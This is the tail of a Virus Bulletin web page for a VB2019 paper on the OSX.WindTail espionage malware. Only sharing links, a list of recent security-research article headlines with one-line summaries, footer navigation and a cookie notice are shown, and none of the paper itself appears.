<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=VB2019 paper: Cyber espionage in the Middle East: Unravelling OSX.WindTail&url=https://www.virusbulletin.com/virusbulletin/2020/04/vb2019-paper-cyber-espionage-middle-east-unravelling-osxwindtail"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2020/04/vb2019-paper-cyber-espionage-middle-east-unravelling-osxwindtail'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2020/04/vb2019-paper-cyber-espionage-middle-east-unravelling-osxwindtail&title=VB2019 paper: Cyber espionage in the Middle East: Unravelling OSX.WindTail"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2020/04/vb2019-paper-cyber-espionage-middle-east-unravelling-osxwindtail&t=VB2019 paper: Cyber espionage in the Middle East: Unravelling OSX.WindTail"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2020/04/vb2019-paper-cyber-espionage-middle-east-unravelling-osxwindtail"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">©1989-2022 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>